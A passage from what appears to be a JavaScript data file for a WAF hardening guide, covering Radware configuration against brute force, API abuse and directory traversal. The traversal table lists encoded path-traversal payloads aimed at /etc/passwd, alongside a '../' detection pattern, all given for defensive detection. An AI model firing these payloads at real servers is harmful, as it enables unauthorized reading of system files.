                { id: '18.4.8', text: 'Set up file extension access controls', priority: 'medium' },
                { id: '18.4.9', text: 'Implement resource enumeration detection', priority: 'high' },
                { id: '18.4.10', text: 'Configure predictable resource detection', priority: 'medium' }
            ]
        },
        {
            title: '18.5 Response & Mitigation Controls',
            icon: 'fa-shield-alt',
            items: [
                { id: '18.5.1', text: 'Configure IP-based blocking for brute force attempts', priority: 'critical' },
                { id: '18.5.2', text: 'Set up session termination capabilities', priority: 'high' },
                { id: '18.5.3', text: 'Implement temporary vs. permanent blocks', priority: 'high' },
                { id: '18.5.4', text: 'Configure progressive challenge mechanisms', priority: 'high' },
                { id: '18.5.5', text: 'Set up bot detection challenges', priority: 'medium' },
                { id: '18.5.6', text: 'Implement response delays for repeated attempts', priority: 'medium' },
                { id: '18.5.7', text: 'Configure custom block pages with information', priority: 'medium' },
                { id: '18.5.8', text: 'Set up automated alerting for attacks', priority: 'high' },
                { id: '18.5.9', text: 'Implement account lockout notifications', priority: 'medium' },
                { id: '18.5.10', text: 'Configure attack attribution mechanisms', priority: 'low' },
                { id: '18.5.11', text: 'Set up attack analytics and reporting', priority: 'medium' },
                { id: '18.5.12', text: 'Implement block list sharing across WAF cluster', priority: 'high' }
            ]
        },
        {
            title: '18.6 Advanced Protection Techniques',
            icon: 'fa-chess-knight',
            items: [
                { id: '18.6.1', text: 'Configure behavior-based brute force detection', priority: 'high' },
                { id: '18.6.2', text: 'Set up machine learning anomaly detection', priority: 'medium' },
                { id: '18.6.3', text: 'Implement distributed attack correlation', priority: 'high' },
                { id: '18.6.4', text: 'Configure credential leak detection integration', priority: 'medium' },
                { id: '18.6.5', text: 'Set up honey credential monitoring', priority: 'medium' },
                { id: '18.6.6', text: 'Implement contextual authentication protection', priority: 'high' },
                { id: '18.6.7', text: 'Configure user behavior analysis', priority: 'medium' },
                { id: '18.6.8', text: 'Set up cross-site brute force protection', priority: 'medium' },
                { id: '18.6.9', text: 'Implement endpoint sensitivity-based protection', priority: 'high' },
                { id: '18.6.10', text: 'Configure time-of-day based protections', priority: 'low' },
                { id: '18.6.11', text: 'Set up geographic-based access restrictions', priority: 'medium' },
                { id: '18.6.12', text: 'Implement automated virtual patching for new attacks', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Authentication Endpoint Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to detect and prevent brute force attacks against authentication endpoints.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure authentication protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure login endpoint identification</div>
                    <div><span class="code-command">login-endpoints</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"admin-login"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"admin-login"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/admin/login"</span></div>
                    <div><span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">username-parameter</span> <span class="code-value">"username"</span></div>
                    <div><span class="code-param">password-parameter</span> <span class="code-value">"password"</span></div>
                    <div><span class="code-param">success-response</span> <span class="code-value">"302"</span></div>
                    <div><span class="code-param">failure-response</span> <span class="code-value">"200"</span></div>
                    <div><span class="code-param">failure-response-pattern</span> <span class="code-value">"Invalid username or password"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"user-login"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"user-login"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/user/login"</span></div>
                    <div><span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">username-parameter</span> <span class="code-value">"email"</span></div>
                    <div><span class="code-param">password-parameter</span> <span class="code-value">"pass"</span></div>
                    <div><span class="code-param">success-response</span> <span class="code-value">"302"</span></div>
                    <div><span class="code-param">failure-response</span> <span class="code-value">"200"</span></div>
                    <div><span class="code-param">failure-response-pattern</span> <span class="code-value">"Login failed"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure rate limiting</div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">max-attempts-per-username</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">max-attempts-per-ip</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">max-attempts-per-session</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">detection-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">cross-endpoint-correlation</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure lockout mechanism</div>
                    <div><span class="code-command">lockout</span></div>
                    <div><span class="code-param">progressive-lockout</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">initial-lockout-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">maximum-lockout-period</span> <span class="code-value">3600</span></div>
                    <div><span class="code-param">lockout-multiplier</span> <span class="code-value">2</span></div>
                    <div><span class="code-param">notify-user</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">reset-after</span> <span class="code-value">86400</span></div>
                    <div class="code-comment"># Configure detection mechanisms</div>
                    <div><span class="code-command">detection</span></div>
                    <div><span class="code-param">credential-stuffing-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">dictionary-attack-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">automated-tool-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">fingerprint-parameters</span> <span class="code-value">"user-agent,accept-language,accept-encoding,screen-resolution"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Brute Force Attack Types</h5>
                <p class="mb-4 text-gray-700">Common types of brute force attacks and their detection methods:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Detection Indicators</th>
                            <th class="p-3 border bg-gray-100">Protection Methods</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Simple Brute Force</td>
                            <td class="p-3 border">Systematic attempts with different password combinations</td>
                            <td class="p-3 border">High rate of failed logins from same source</td>
                            <td class="p-3 border">Rate limiting, account lockout, progressive delays</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Dictionary Attack</td>
                            <td class="p-3 border">Attempts using common passwords or password lists</td>
                            <td class="p-3 border">Multiple failures with known weak passwords</td>
                            <td class="p-3 border">Password pattern detection, common password lists</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Credential Stuffing</td>
                            <td class="p-3 border">Attempts using known username/password combinations from data breaches</td>
                            <td class="p-3 border">Multiple accounts targeted with specific credentials</td>
                            <td class="p-3 border">Known credential pair detection, cross-user correlation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Distributed Brute Force</td>
                            <td class="p-3 border">Attempts distributed across multiple IPs to avoid detection</td>
                            <td class="p-3 border">Similar patterns from different IPs, coordinated timing</td>
                            <td class="p-3 border">User-based rate limiting, global pattern detection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Reverse Brute Force</td>
                            <td class="p-3 border">Testing one password against many usernames</td>
                            <td class="p-3 border">Same password used across multiple accounts</td>
                            <td class="p-3 border">Cross-user correlation, parameter pattern analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Low & Slow Attack</td>
                            <td class="p-3 border">Slow-rate attack to stay below rate limiting thresholds</td>
                            <td class="p-3 border">Failed logins spread over longer time periods</td>
                            <td class="p-3 border">Long-term pattern analysis, cumulative attempt tracking</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Authentication Protection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Multi-layered Defense:</strong> Implement detection at IP, username, and session levels</li>
                    <li class="mb-2"><strong>Progressive Penalties:</strong> Increase lockout duration with repeated violations</li>
                    <li class="mb-2"><strong>Cross-Endpoint Correlation:</strong> Track attempts across different login endpoints</li>
                    <li class="mb-2"><strong>Contextual Detection:</strong> Consider time patterns, geographic anomalies, and client fingerprints</li>
                    <li class="mb-2"><strong>Transparent Challenges:</strong> Implement CAPTCHAs or JavaScript challenges before blocking</li>
                    <li class="mb-2"><strong>Monitoring and Alerting:</strong> Generate alerts for suspicious authentication patterns</li>
                    <li class="mb-2"><strong>User Notification:</strong> Inform users of account lockouts or suspicious activities</li>
                    <li class="mb-2"><strong>Sensitive Account Protection:</strong> Apply stricter controls for admin or privileged accounts</li>
                    <li class="mb-2"><strong>Custom Response Pages:</strong> Provide informative but security-conscious block pages</li>
                    <li class="mb-2"><strong>Distinguish Human vs. Bot:</strong> Apply different policies based on client classification</li>
                </ul>
            `
        },
        {
            title: 'API Brute Force Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to protect API endpoints from brute force and enumeration attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API brute force protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure API endpoint protection</div>
                    <div><span class="code-command">api-endpoints</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"token-endpoint"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"token-endpoint"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/api/v1/token"</span></div>
                    <div><span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div><span class="code-param">auth-type</span> <span class="code-value">"credential"</span></div>
                    <div><span class="code-param">success-response</span> <span class="code-value">"200"</span></div>
                    <div><span class="code-param">failure-response</span> <span class="code-value">"401,403"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"resource-endpoint"</span></div>
                    <div><span class="code-command">endpoint</span> <span class="code-value">"resource-endpoint"</span></div>
                    <div><span class="code-param">url</span> <span class="code-value">"/api/v1/resources/*"</span></div>
                    <div><span class="code-param">method</span> <span class="code-value">"GET,POST,PUT,DELETE"</span></div>
                    <div><span class="code-param">auth-type</span> <span class="code-value">"token"</span></div>
                    <div><span class="code-param">success-response</span> <span class="code-value">"200,201,204"</span></div>
                    <div><span class="code-param">failure-response</span> <span class="code-value">"401,403"</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Configure rate limiting</div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">token-endpoint-rate</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">resource-endpoint-rate</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">per-client-rate</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">per-token-rate</span> <span class="code-value">200</span></div>
                    <div><span class="code-param">rate-window</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># Configure token abuse protection</div>
                    <div><span class="code-command">token-protection</span></div>
                    <div><span class="code-param">invalid-token-rate</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">token-enumeration-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-pattern-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-rotation-enforcement</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure advanced detection</div>
                    <div><span class="code-command">detection</span></div>
                    <div><span class="code-param">resource-enumeration-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sequential-id-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">anomaly-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-reputation-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Attack Vectors</h5>
                <p class="mb-4 text-gray-700">Common attack vectors targeting API endpoints and their mitigation:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Vector</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Detection Method</th>
                            <th class="p-3 border bg-gray-100">Protection Strategy</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Token Brute Force</td>
                            <td class="p-3 border">Systematic guessing of API tokens or keys</td>
                            <td class="p-3 border">High rate of invalid token usage</td>
                            <td class="p-3 border">Token attempt rate limiting, entropy validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Resource Enumeration</td>
                            <td class="p-3 border">Sequential scanning of resource IDs</td>
                            <td class="p-3 border">Sequential access patterns to resources</td>
                            <td class="p-3 border">Resource request rate limiting, pattern detection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Credential Stuffing</td>
                            <td class="p-3 border">Mass login attempts to API auth endpoints</td>
                            <td class="p-3 border">High volume of auth requests with varying credentials</td>
                            <td class="p-3 border">Auth endpoint rate limiting, reputation tracking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Parameter Tampering</td>
                            <td class="p-3 border">Systematic testing of different parameter values</td>
                            <td class="p-3 border">Rapid parameter variation in requests</td>
                            <td class="p-3 border">Request pattern analysis, parameter value tracking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Distributed API Attacks</td>
                            <td class="p-3 border">Coordinated attacks from multiple sources</td>
                            <td class="p-3 border">Similar patterns across multiple clients</td>
                            <td class="p-3 border">Global rate limiting, behavioral correlation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">API DDoS</td>
                            <td class="p-3 border">Overwhelming API endpoints with excessive requests</td>
                            <td class="p-3 border">Abnormal traffic volume patterns</td>
                            <td class="p-3 border">Adaptive rate limiting, client classification</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Protection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Endpoint Classification:</strong> Apply different protection levels based on endpoint sensitivity</li>
                    <li class="mb-2"><strong>Token Validation:</strong> Enforce proper token structure and entropy</li>
                    <li class="mb-2"><strong>Multi-dimension Rate Limiting:</strong> Apply limits per client, token, endpoint, and globally</li>
                    <li class="mb-2"><strong>Request Pattern Analysis:</strong> Detect unusual access patterns or parameter variations</li>
                    <li class="mb-2"><strong>Client Reputation:</strong> Track client behavior over time and adjust security controls</li>
                    <li class="mb-2"><strong>Contextual Authentication:</strong> Consider additional factors beyond just API keys</li>
                    <li class="mb-2"><strong>Correlation Analysis:</strong> Identify distributed attacks through behavioral correlation</li>
                    <li class="mb-2"><strong>Token Lifecycle Enforcement:</strong> Enforce token rotation and expiration policies</li>
                    <li class="mb-2"><strong>Adaptive Response:</strong> Escalate protective measures based on threat severity</li>
                    <li class="mb-2"><strong>Granular Monitoring:</strong> Implement detailed logging of API abuse attempts</li>
                </ul>
            `
        },
        {
            title: 'Directory Traversal & Browsing Prevention',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to prevent directory traversal attacks and unauthorized directory browsing.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure directory protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">directory-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure traversal protection</div>
                    <div><span class="code-command">traversal-protection</span></div>
                    <div><span class="code-param">detection-state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">path-normalization</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">directory-whitelisting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">patterns</span></div>
                    <div><span class="code-param">standard-patterns</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">null-byte-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">encoded-traversal-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">os-command-injection-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">custom-pattern</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"custom-traversal-1"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"\\.\\.\\/"</span></div>
                    <div><span class="code-param">severity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">whitelist</span></div>
                    <div><span class="code-param">allowed-directories</span> <span class="code-value">"/public,/images,/css,/js,/static"</span></div>
                    <div><span class="code-param">max-directory-depth</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">max-path-length</span> <span class="code-value">255</span></div>
                    <div class="code-comment"># Configure directory listing protection</div>
                    <div><span class="code-command">listing-protection</span></div>
                    <div><span class="code-param">detection-state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detect-directory-indexing</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">directory-listing-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">index-enforcement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">sensitive-directories</span></div>
                    <div><span class="code-param">directories</span> <span class="code-value">"/admin,/backup,/config,/includes,/private,/uploads"</span></div>
                    <div><span class="code-param">protection-level</span> <span class="code-value">high</span></div>
                    <div class="code-comment"># Configure directory scanning detection</div>
                    <div><span class="code-command">scanning-protection</span></div>
                    <div><span class="code-param">detection-state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">web-scanner-signatures</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">resource-enumeration-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">rate-based-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-directory-requests</span> <span class="code-value">30</span></div>
                    <div><span class="code-param">detection-window</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># Configure responses</div>
                    <div><span class="code-command">responses</span></div>
                    <div><span class="code-param">traversal-response-code</span> <span class="code-value">403</span></div>
                    <div><span class="code-param">listing-response-code</span> <span class="code-value">403</span></div>
                    <div><span class="code-param">custom-error-page</span> <span class="code-value">"/custom/dir-error.html"</span></div>
                    <div><span class="code-param">mask-server-banner</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Directory Traversal Techniques</h5>
                <p class="mb-4 text-gray-700">Common techniques used in directory traversal attacks and their detection methods:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Technique</th>
                            <th class="p-3 border bg-gray-100">Example</th>
                            <th class="p-3 border bg-gray-100">Detection Method</th>
                            <th class="p-3 border bg-gray-100">Protection Approach</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Basic Traversal</td>
                            <td class="p-3 border">../../etc/passwd</td>
                            <td class="p-3 border">Pattern matching for "../" sequences</td>
                            <td class="p-3 border">Block requests containing traversal patterns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">URL Encoding</td>
                            <td class="p-3 border">%2e%2e%2f%2e%2e%2fetc%2fpasswd</td>
                            <td class="p-3 border">URL decode before pattern matching</td>
                            <td class="p-3 border">Normalized path inspection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Double Encoding</td>
                            <td class="p-3 border">%252e%252e%252f%252e%252e%252fetc%252fpasswd</td>
                            <td class="p-3 border">Multiple decode passes</td>
                            <td class="p-3 border">Recursive normalization and inspection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Null Byte Injection</td>
                            <td class="p-3 border">../../../etc/passwd%00.jpg</td>
                            <td class="p-3 border">Null byte detection in requests</td>
                            <td class="p-3 border">Remove/block null bytes in file paths</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Path Manipulation</td>
                            <td class="p-3 border">..././.././../etc/passwd</td>
                            <td class="p-3 border">Path normalization before inspection</td>
                            <td class="p-3 border">Canonicalize paths before evaluation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Unicode Encoding</td>
                            <td class="p-3 border">..%u2215..%u2215etc%u2215passwd</td>
                            <td class="p-3 border">Unicode-aware pattern matching</td>
                            <td class="p-3 border">Unicode normalization before inspection</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Directory Protection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Path Normalization:</strong> Normalize all paths before security evaluation</li>
                    <li class="mb-2"><strong>Whitelisting Approach:</strong> Allow access only to explicitly permitted directories</li>
                    <li class="mb-2"><strong>Multi-layer Detection:</strong> Implement multiple traversal detection techniques</li>
                    <li class="mb-2"><strong>Custom Error Pages:</strong> Implement non-revealing error responses</li>
                    <li class="mb-2"><strong>Index Enforcement:</strong> Require index files in all browsable directories</li>
                    <li class="mb-2"><strong>Server Banner Masking:</strong> Hide server information to prevent fingerprinting</li>
                    <li class="mb-2"><strong>Sensitive Directory Protection:</strong> Apply enhanced security to critical directories</li>
                    <li class="mb-2"><strong>Directory Depth Limits:</strong> Restrict maximum directory depth in requests</li>
                    <li class="mb-2"><strong>Scanner Detection:</strong> Identify and block automated directory scanning tools</li>
                    <li class="mb-2"><strong>Restricted File Extensions:</strong> Control access to sensitive file types</li>
                    <li class="mb-2"><strong>Rate Limiting:</strong> Restrict the number of directory requests per client</li>
                    <li class="mb-2"><strong>Proper Permissions:</strong> Enforce least privilege access to directory resources</li>
                </ul>
            `
        },
        {
            title: 'Advanced Brute Force Mitigation Techniques',
            content: `
                <p class="mb-4 text-gray-700">Configure advanced brute force mitigation techniques in Radware WAF for comprehensive protection.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced brute force mitigation</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">brute-force-protection</span></div>
                    <div><span class="code-command">advanced-mitigation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure behavioral analysis</div>
                    <div><span class="code-command">behavioral-analysis</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">learning-period</span> <span class="code-value">7</span></div>
                    <div><span class="code-param">confidence-threshold</span> <span class="code-value">70</span></div>
                    <div><span class="code-param">analyze-timing-patterns</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">analyze-request-patterns</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">analyze-error-responses</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure distributed attack protection</div>
                    <div><span class="code-command">distributed-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">global-correlation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ip-group-detection</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">subnet-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">track-adjacent-ips</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure challenge mechanisms</div>
                    <div><span class="code-command">challenges</span></div>
                    <div><span class="code-param">progressive-challenges</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">javascript-challenge</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">captcha-challenge</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">invisible-captcha</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">challenge-threshold</span> <span class="code-value">3</span></div>
                    <div><span class="code-param">block-threshold</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Configure contextual protection</div>
                    <div><span class="code-command">contextual-protection</span></div>
                    <div><span class="code-param">geolocation-analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">time-based-analysis</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">unusual-hours-sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-param">device-correlation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">historical-behavior-tracking</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure honeypot integration</div>
                    <div><span class="code-command">deception</span></div>
                    <div><span class="code-param">honey-credentials</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">login-delay</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">credential-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">response-manipulation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Mitigation Techniques</h5>
                <p class="mb-4 text-gray-700">Sophisticated approaches to brute force attack mitigation:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Technique</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Benefits</th>
                            <th class="p-3 border bg-gray-100">Implementation Considerations</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Behavioral Analysis</td>
                            <td class="p-3 border">Learns normal authentication patterns and detects anomalies</td>
                            <td class="p-3 border">Effective against sophisticated attacks, low false positives</td>
                            <td class="p-3 border">Requires learning period, computational resources</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Progressive Challenges</td>
                            <td class="p-3 border">Escalates security measures based on suspicion level</td>
                            <td class="p-3 border">Balances security and user experience, adaptive response</td>
                            <td class="p-3 border">Complex implementation, requires multiple challenge types</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Global Correlation</td>
                            <td class="p-3 border">Links attack patterns across multiple sources and targets</td>
                            <td class="p-3 border">Effective against distributed attacks, broad protection</td>
                            <td class="p-3 border">Requires global visibility, data sharing mechanisms</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Contextual Protection</td>
                            <td class="p-3 border">Considers time, location, device factors in authentication</td>
                            <td class="p-3 border">Highly accurate detection, adaptive security</td>
                            <td class="p-3 border">Potential for false positives, privacy considerations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Deception Technology</td>
                            <td class="p-3 border">Uses honeypot credentials and delayed responses</td>
                            <td class="p-3 border">Wastes attacker resources, provides early warning</td>
                            <td class="p-3 border">Implementation complexity, potential legal concerns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Device Fingerprinting</td>
                            <td class="p-3 border">Creates unique identifiers beyond IP addresses</td>
                            <td class="p-3 border">Bypasses IP rotation attacks, persistent tracking</td>
                            <td class="p-3 border">Privacy considerations, technical complexity</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Implementation Strategies</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Defense in Depth:</strong> Layer multiple protection mechanisms for comprehensive coverage</li>
                    <li class="mb-2"><strong>Risk-Based Approach:</strong> Apply stronger protections to high-value targets</li>
                    <li class="mb-2"><strong>User Experience Balance:</strong> Implement invisible protections before user-visible challenges</li>
                    <li class="mb-2"><strong>Adaptive Response:</strong> Dynamically adjust security levels based on threat intelligence</li>
                    <li class="mb-2"><strong>Continuous Learning:</strong> Regularly update detection models based on new attack patterns</li>
                    <li class="mb-2"><strong>Cross-Platform Protection:</strong> Coordinate protection across web, mobile, and API interfaces</li>
                    <li class="mb-2"><strong>Incident Response Integration:</strong> Connect brute force detection to broader security operations</li>
                    <li class="mb-2"><strong>User Notification:</strong> Implement transparent security notifications when appropriate</li>
                    <li class="mb-2"><strong>Attack Analytics:</strong> Learn from attack patterns to improve future protection</li>
                    <li class="mb-2"><strong>Threat Intelligence Integration:</strong> Incorporate external data on attack trends and sources</li>
                </ul>
            `
        },
        {
            title: 'Response & Mitigation Controls',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive response and mitigation controls for brute force and directory attacks in Radware WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure response & mitigation controls</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">security-responses</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure blocking mechanisms</div>
                    <div><span class="code-command">blocking</span></div>
                    <div><span class="code-param">ip-blocking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">initial-block-period</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">max-block-period</span> <span class="code-value">86400</span></div>
                    <div><span class="code-param">block-multiplier</span> <span class="code-value">2</span></div>
                    <div><span class="code-param">subnet-blocking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">subnet-block-threshold</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">block-synchronization</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure challenge responses</div>
                    <div><span class="code-command">challenges</span></div>
                    <div><span class="code-param">challenge-response-code</span> <span class="code-value">403</span></div>
